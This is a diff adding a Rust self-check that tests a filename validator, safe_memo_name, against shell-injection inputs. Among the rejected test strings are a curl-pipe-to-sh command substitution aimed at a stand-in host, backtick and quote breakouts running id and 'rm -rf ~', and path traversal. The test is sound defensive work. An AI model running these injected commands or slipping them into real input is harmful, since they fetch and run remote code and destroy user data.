@@ -7097,6 +7097,22 @@ fn selfcheck() -> Result<()> {
         }
         println!("[selfcheck] orders: the agent cannot run on unblessed instructions ... PASS");
 
+        {
+            // A memo's filename is typed into a shell by the captain's "assign" tap, inside the
+            // worker brief — and the captain approved a TITLE, never this string.
+            assert!(manager::safe_memo_name("deploy-is-failing.md"), "an ordinary memo");
+            assert!(manager::safe_memo_name("card-daemon-restart-0-failed-1785612895.md"));
+            assert!(!manager::safe_memo_name("x$(curl evil.sh|sh).md"), "no substitution");
+            assert!(!manager::safe_memo_name("x`id`.md"), "no backticks");
+            assert!(!manager::safe_memo_name("x\";id;\".md"), "no quote to break out of");
+            assert!(!manager::safe_memo_name("x' ; rm -rf ~ ; '.md"), "nor a single quote");
+            assert!(!manager::safe_memo_name("has space.md"), "no word splitting");
+            assert!(!manager::safe_memo_name("../../escape.md"), "no traversal");
+            assert!(!manager::safe_memo_name(".hidden.md"), "dotfiles are not memos");
+            assert!(!manager::safe_memo_name("notamemo.txt"), "only .md");
+        }
+        println!("[selfcheck] memo: a filename cannot carry a command ... PASS");
+
         #[cfg(feature = "web")]
         {
             // The pairing token faces a public tunnel URL, so equality must not leak a matching
